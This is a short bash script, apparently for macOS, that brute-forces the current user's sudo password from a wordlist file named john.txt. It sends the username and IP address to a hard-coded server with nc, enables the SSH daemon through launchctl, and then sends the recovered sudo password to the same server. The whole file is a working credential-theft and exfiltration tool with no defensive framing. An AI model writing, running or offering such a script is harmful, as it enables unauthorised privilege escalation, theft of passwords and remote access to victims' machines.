#!/bin/bash

# Server IP address
server_ip="192.168.0.108"
# Server port
server_port="1234"

echo 'Sudo bruteforce started...'

current_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
file_path="$current_dir/john.txt"
username=$(whoami)
ipaddress=$(ifconfig en0 | grep inet | awk '{print $2}')

echo "Usename: $username" | nc $server_ip $server_port
sleep 1
echo "IP address: $ipaddress" | nc $server_ip $server_port

while IFS= read -r password || [[ -n "$password" ]]; do
    if sudo -S ls <<< "$password"; then
        echo "Access Granted!"
        echo "Username: $username"
        echo "Sudo password: $password"
        break
    else
        echo "Access Denied: $password"
    fi
done < "$file_path"

# SSH enable if it was disable
sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist


# Server informations
echo "Sending message to server..."
echo "Server IP: $server_ip"
echo "Server port: $server_port"
echo "Sudo password: $password" | nc $server_ip $server_port